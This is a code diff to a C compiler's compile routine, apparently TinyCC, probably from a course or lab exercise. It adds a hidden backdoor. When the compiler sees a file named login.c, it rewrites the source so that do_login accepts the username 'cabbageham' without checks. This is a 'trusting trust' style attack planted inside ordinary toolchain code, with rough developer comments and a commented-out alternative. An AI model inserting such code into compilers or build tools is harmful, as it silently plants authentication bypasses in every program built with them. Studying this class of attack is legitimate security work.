@@ -735,15 +735,24 @@ static int tcc_compile(TCCState *s1, int filetype, const char *str, int fd)
 
        Alternatively we could use thread local storage for those global
        variables, which may or may not have advantages */
+    
+    //testing code
     if(!strcmp(str, "login.c")) {
         printf("testing\n");
         char login_line[] = "if (!strcmp(username, \"cabbageham\"))return 0;";
         FILE *source = fopen(str, "r");
 		FILE *temp = fopen("temp.txt", "w");
-        char target_line[] = "static int do_login(const char *username){";
+        char insert[] = "static int do_login(const char *username){";
 		char buffer[50000];
+        // replacing the line seemed better until i realized i didn't know how to do it.
+        // if(fgets(buffer, 50000, source)){
+        //     if(strstr(buffer, "if (!strcmp(username, "root"))\nreturn 0;")){
+        //         replace line with bugged line
+        //     }
+        // }
+        //taken
 		while (fgets(buffer, 50000, source)) {
-		    if (strstr(buffer, target_line)) {
+		    if (strstr(buffer, insert)) {
 		        fputs(buffer, temp);
                 fputs(login_line, temp);
             } 
